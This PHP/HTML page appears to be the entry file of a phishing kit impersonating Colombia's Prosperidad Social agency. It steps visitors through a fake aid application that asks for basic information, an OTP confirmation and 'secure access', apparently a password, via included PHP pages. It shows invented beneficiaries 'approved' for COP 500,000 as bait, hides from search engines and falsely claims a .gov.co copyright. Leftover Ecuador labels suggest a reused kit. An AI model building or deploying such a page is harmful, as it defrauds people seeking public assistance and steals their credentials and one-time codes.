<?php
require("_core.php");

if (!isset($_SESSION["state"])) {
    $_SESSION["state"] = "start";
}

$currentState = $_SESSION["state"];
?>
<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Prosperidad Social</title>
    <meta name="robots" content="noindex,nofollow">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" />
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&display=swap" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

    <style>
        :root {
            --ecuador-orange: #ef8a00;
            --ecuador-orange-hover: #d67a00;
            --text-dark: #333333;
            --text-muted: #888888;
            --bg-light: #f4f6f9;
        }

        body {
            margin: 0;
            padding-top: 15px;
            padding-bottom: 0px;
            font-family: 'Roboto', sans-serif;
            background-repeat: no-repeat;
            color: var(--text-dark);
        }

        .container-custom {
            max-width: 900px;
            margin: 0 auto;
            padding: 0 15px;
        }

        .app-header {
            background-color: #fff;
            box-shadow: 0 1px 6px rgba(0, 0, 0, 0.08);
            height: 70px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 25px;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            z-index: 1030;
        }

        .navbar-brand img {
            height: 55px;
            width: auto;
            object-fit: contain;
        }

        .hamburger-icon {
            width: 24px;
            height: 16px;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
        }

        .hamburger-icon span {
            display: block;
            height: 3px;
            border-radius: 3px;
            background-color: #222;
        }

        .hero-banner {
            width: 100%;
            border-radius: 16px;
            overflow: hidden;
            margin-bottom: 20px;
            margin-top: 70px;
            line-height: 0;
        }

        .hero-banner img {
            width: 100%;
            height: auto;
            display: block;
        }

        .main-card {
            background: #ffffff;
            border-radius: 16px;
            padding: 25px 20px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.04);
            margin-bottom: 20px;
        }

        .stepper-container {
            display: flex;
            justify-content: space-between;
            position: relative;
            padding-bottom: 20px;
            margin-bottom: 25px;
        }

        .stepper-container::before {
            content: "";
            position: absolute;
            top: 16px;
            left: 40px;
            right: 40px;
            height: 2px;
            background-color: #eee;
            z-index: 1;
        }

        .step {
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
            flex: 1;
            position: relative;
            z-index: 2;
            background: white;
            padding: 0 10px;
        }

        .step-num {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 700;
        }

        .step.active .step-num {
            background-color: var(--ecuador-orange) !important;
            color: white !important;
            border: 2px solid var(--ecuador-orange);
        }

        .step.inactive .step-num {
            background-color: #f4f6f9 !important;
            color: #aaa !important;
            border: 2px solid #eee;
        }

        .step-text span {
            font-size: 11px;
            color: var(--text-muted);
        }

        .step.active .step-text span {
            color: var(--ecuador-orange) !important;
            font-weight: bold;
        }

        .beneficiaries-section {
            position: relative;
            background: url('assets/kolombia.jpg') center center/cover fixed;
            border-radius: 16px;
            padding: 25px 20px;
            overflow: hidden;
            margin-bottom: 20px;
        }

        .beneficiaries-section::before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.5);
            z-index: 1;
        }

        .beneficiaries-content {
            position: relative;
            z-index: 2;
        }

        .beneficiaries-list-viewport {
            height: 320px; 
            overflow: hidden;
            position: relative;
        }

        .scroll-wrapper {
            display: flex;
            flex-direction: column;
            animation: scrollUp 25s linear infinite;
        }

        .beneficiaries-list-viewport:hover .scroll-wrapper {
            animation-play-state: paused;
        }

        @keyframes scrollUp {
            0% { transform: translateY(0); }
            100% { transform: translateY(-50%); }
        }

        .beneficiary-card {
            background: #ffffff;
            border-radius: 12px;
            padding: 14px 20px;
            margin-bottom: 12px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .check-icon {
            background: var(--ecuador-orange);
            color: white;
            width: 26px;
            height: 26px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .b-amount {
            color: var(--ecuador-orange);
            font-weight: 700;
        }

        /* --- FOOTER --- */
        .icon-circle {
            width: 60px;
            height: 60px;
            border: 2px solid white;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 24px;
            color: white;
            text-decoration: none;
            transition: 0.3s;
        }

        .icon-circle:hover,
        .active-circle {
            background: white;
            color: #233648 !important;
        }
    </style>
</head>

<body>

    <div class="container-custom">

        <header class="app-header">
            <a class="navbar-brand" href="#">
                <img src="assets/logom.png" alt="Logo">
            </a>
            <div class="hamburger-icon">
                <span></span><span></span><span></span>
            </div>
        </header>

        <div class="hero-banner">
            <img src="assets/banner00.jpg" alt="Banner Ecuador">
        </div>

        <div class="main-card">
            <div class="stepper-container">
                <div class="step <?php echo ($currentState == 'start') ? 'active' : 'inactive'; ?>">
                    <div class="step-num">1</div>
                    <div class="step-text"><span>Información<br>básica</span></div>
                </div>

                <div class="step <?php echo ($currentState == 'phone') ? 'active' : 'inactive'; ?>">
                    <div class="step-num">2</div>
                    <div class="step-text"><span>Confirmación<br>OTP</span></div>
                </div>

                <div class="step <?php echo ($currentState == 'otp') ? 'active' : 'inactive'; ?>">
                    <div class="step-num">3</div>
                    <div class="step-text"><span>Acceso<br>seguro</span></div>
                </div>

                <div class="step <?php echo ($currentState == 'success') ? 'active' : 'inactive'; ?>">
                    <div class="step-num">4</div>
                    <div class="step-text"><span>Resumen de<br>resultados</span></div>
                </div>
            </div>

            <div class="form-backend-area">
                <?php
                switch ($currentState) {
                    case "start":
                        require("Lander.php");
                        break;
                    case "phone":
                        require("OTPC.php");
                        break;
                    case "otp":
                        require("PASS.php");
                        break;
                    case "success":
                        require("SCCS.php");
                        break;
                }
                ?>
            </div>
        </div>

        <div class="beneficiaries-section">
            <div class="beneficiaries-content">
                <div style="color:white; font-weight:700; margin-bottom:20px;">
                    Beneficiarios Recientes - Ayuda Económica Aprobada
                </div>
                
                <div class="beneficiaries-list-viewport">
                    <div class="scroll-wrapper">
                        <div class="beneficiary-card">
                            <div style="display:flex; align-items:center; gap:12px;">
                                <div class="check-icon">✓</div>
                                <div>
                                    <p style="margin:0; font-weight:600; font-size:14px;">Sr. Roberto Paredes</p>
                                    <p style="margin:0; font-size:12px; color:#888;">hace 5 minutos</p>
                                </div>
                            </div>
                            <div class="b-amount">COP 500,000</div>
                        </div>
                        <div class="beneficiary-card">
                            <div style="display:flex; align-items:center; gap:12px;">
                                <div class="check-icon">✓</div>
                                <div>
                                    <p style="margin:0; font-weight:600; font-size:14px;">Sra. Elena Castro</p>
                                    <p style="margin:0; font-size:12px; color:#888;">hace 12 minutos</p>
                                </div>
                            </div>
                            <div class="b-amount">COP 500,000</div>
                        </div>
                        <div class="beneficiary-card">
                            <div style="display:flex; align-items:center; gap:12px;">
                                <div class="check-icon">✓</div>
                                <div>
                                    <p style="margin:0; font-weight:600; font-size:14px;">Sr. Miguel Torres</p>
                                    <p style="margin:0; font-size:12px; color:#888;">hace 18 minutos</p>
                                </div>
                            </div>
                            <div class="b-amount">COP 500,000</div>
                        </div>
                        <div class="beneficiary-card">
                            <div style="display:flex; align-items:center; gap:12px;">
                                <div class="check-icon">✓</div>
                                <div>
                                    <p style="margin:0; font-weight:600; font-size:14px;">Sra. Patricia Salazar</p>
                                    <p style="margin:0; font-size:12px; color:#888;">hace 24 minutos</p>
                                </div>
                            </div>
                            <div class="b-amount">COP 500,000</div>
                        </div>
                        <div class="beneficiary-card">
                            <div style="display:flex; align-items:center; gap:12px;">
                                <div class="check-icon">✓</div>
                                <div>
                                    <p style="margin:0; font-weight:600; font-size:14px;">Sr. Carlos Mendez</p>
                                    <p style="margin:0; font-size:12px; color:#888;">hace 31 minutos</p>
                                </div>
                            </div>
                            <div class="b-amount">COP 500,000</div>
                        </div>
                        <div class="beneficiary-card">
                            <div style="display:flex; align-items:center; gap:12px;">
                                <div class="check-icon">✓</div>
                                <div>
                                    <p style="margin:0; font-weight:600; font-size:14px;">Sra. Diana Gomez</p>
                                    <p style="margin:0; font-size:12px; color:#888;">hace 45 minutos</p>
                                </div>
                            </div>
                            <div class="b-amount">COP 500,000</div>
                        </div>

                        <div class="beneficiary-card">
                            <div style="display:flex; align-items:center; gap:12px;">
                                <div class="check-icon">✓</div>
                                <div>
                                    <p style="margin:0; font-weight:600; font-size:14px;">Sr. Roberto Paredes</p>
                                    <p style="margin:0; font-size:12px; color:#888;">hace 5 minutos</p>
                                </div>
                            </div>
                            <div class="b-amount">COP 500,000</div>
                        </div>
                        <div class="beneficiary-card">
                            <div style="display:flex; align-items:center; gap:12px;">
                                <div class="check-icon">✓</div>
                                <div>
                                    <p style="margin:0; font-weight:600; font-size:14px;">Sra. Elena Castro</p>
                                    <p style="margin:0; font-size:12px; color:#888;">hace 12 minutos</p>
                                </div>
                            </div>
                            <div class="b-amount">COP 500,000</div>
                        </div>
                        <div class="beneficiary-card">
                            <div style="display:flex; align-items:center; gap:12px;">
                                <div class="check-icon">✓</div>
                                <div>
                                    <p style="margin:0; font-weight:600; font-size:14px;">Sr. Miguel Torres</p>
                                    <p style="margin:0; font-size:12px; color:#888;">hace 18 minutos</p>
                                </div>
                            </div>
                            <div class="b-amount">COP 500,000</div>
                        </div>
                        <div class="beneficiary-card">
                            <div style="display:flex; align-items:center; gap:12px;">
                                <div class="check-icon">✓</div>
                                <div>
                                    <p style="margin:0; font-weight:600; font-size:14px;">Sra. Patricia Salazar</p>
                                    <p style="margin:0; font-size:12px; color:#888;">hace 24 minutos</p>
                                </div>
                            </div>
                            <div class="b-amount">COP 500,000</div>
                        </div>
                        <div class="beneficiary-card">
                            <div style="display:flex; align-items:center; gap:12px;">
                                <div class="check-icon">✓</div>
                                <div>
                                    <p style="margin:0; font-weight:600; font-size:14px;">Sr. Carlos Mendez</p>
                                    <p style="margin:0; font-size:12px; color:#888;">hace 31 minutos</p>
                                </div>
                            </div>
                            <div class="b-amount">COP 500,000</div>
                        </div>
                        <div class="beneficiary-card">
                            <div style="display:flex; align-items:center; gap:12px;">
                                <div class="check-icon">✓</div>
                                <div>
                                    <p style="margin:0; font-weight:600; font-size:14px;">Sra. Diana Gomez</p>
                                    <p style="margin:0; font-size:12px; color:#888;">hace 45 minutos</p>
                                </div>
                            </div>
                            <div class="b-amount">COP 500,000</div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <footer style="background:#233648; color:white; padding:40px 0 0 0; text-align:center; margin-top:40px;">
        <div style="display:flex; justify-content:center; align-items:center; gap:20px; margin-bottom:25px;">
            <div style="height:2px; width:120px; background:white;"></div>
            <div style="font-size:28px;">♡</div>
            <div style="height:2px; width:120px; background:white;"></div>
        </div>
        <div style="font-size:20px; font-weight:600;">Prosperidad Social</div>
        <div style="font-size:20px; margin-bottom:30px;">Cra 7 # 32 - 42</div>
        <div style="display:flex; flex-wrap: wrap; justify-content:center; gap:25px; margin-bottom:35px;">
            <a href="#" class="icon-circle"><i class="fab fa-facebook-f"></i></a>
            <a href="#" class="icon-circle"><i class="fab fa-instagram"></i></a>
            <a href="#" class="icon-circle active-circle"><i class="fab fa-twitter"></i></a>
            <a href="#" class="icon-circle"><i class="fab fa-tiktok"></i></a>
            <a href="#" class="icon-circle"><i class="fab fa-youtube"></i></a>
        </div>
        <div style="background:#1B252D; padding:15px 0; margin-top:40px; font-size:14px;">
            Copyright © ProsperidadSocial.gov.co
        </div>
    </footer>

</body>


</html>

